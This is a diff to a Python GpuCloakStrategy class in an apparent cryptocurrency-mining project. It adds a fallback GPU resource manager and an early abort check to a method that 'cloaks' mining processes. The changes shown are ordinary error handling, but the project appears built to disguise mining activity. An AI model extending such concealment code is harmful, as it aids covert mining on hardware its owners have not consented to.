@@ -1247,6 +1247,22 @@ class GpuCloakStrategy(CloakStrategy):
         """
         self.logger = logger
         self.config = config
+
+        # ✅ FALLBACK: If GPUResourceManager not provided, create on-demand
+        if gpu_resource_manager is None:
+            self.logger.warning("⚠️ GPUResourceManager is None – creating fallback instance (on-demand)")
+            try:
+                # Tránh import vòng lặp
+                from mining_environment.scripts.resource_control import GPUResourceManager as _GPUResourceManager
+                from mining_environment.scripts.unified_logging import get_unified_logger
+
+                fallback_logger = get_unified_logger('resource_control')
+                gpu_resource_manager = _GPUResourceManager(config, fallback_logger)
+                self.logger.info("✅ Fallback GPUResourceManager created successfully")
+            except Exception as err:
+                self.logger.error(f"❌ Failed to create fallback GPUResourceManager: {err}")
+                gpu_resource_manager = None
+
         self.gpu_resource_manager = cast(Any, gpu_resource_manager)
 
         self.stop_monitoring = False  # Thêm thuộc tính stop_monitoring
@@ -1320,14 +1336,17 @@ class GpuCloakStrategy(CloakStrategy):
         
     def apply(self, process: MiningProcess) -> bool:
         """
-        ✅ UNIFIED: Comprehensive GPU cloaking với integrated thermal management và return validation.
+        ✅ UNIFIED: Áp dụng GPU cloaking với metadata-aware optimization và return validation.
         
-        Combines GPU performance control và thermal protection trong single strategy.
-        
-        :param process: Đối tượng MiningProcess.
+        :param process: Enhanced MiningProcess với classification metadata.
         :return: bool - True nếu GPU cloaking áp dụng thành công, False nếu thất bại
         """
         try:
+            # ✅ SAFETY CHECK: Ensure gpu_resource_manager ready
+            if self.gpu_resource_manager is None:
+                self.logger.error("💀 GPUResourceManager not available – aborting gpu_cloaking apply")
+                return False
+
             pid, name = process.pid, process.name
 
             self.logger.info(f"🎮 [Unified GPU Cloaking] Processing {name} (PID={pid}) with integrated thermal control")
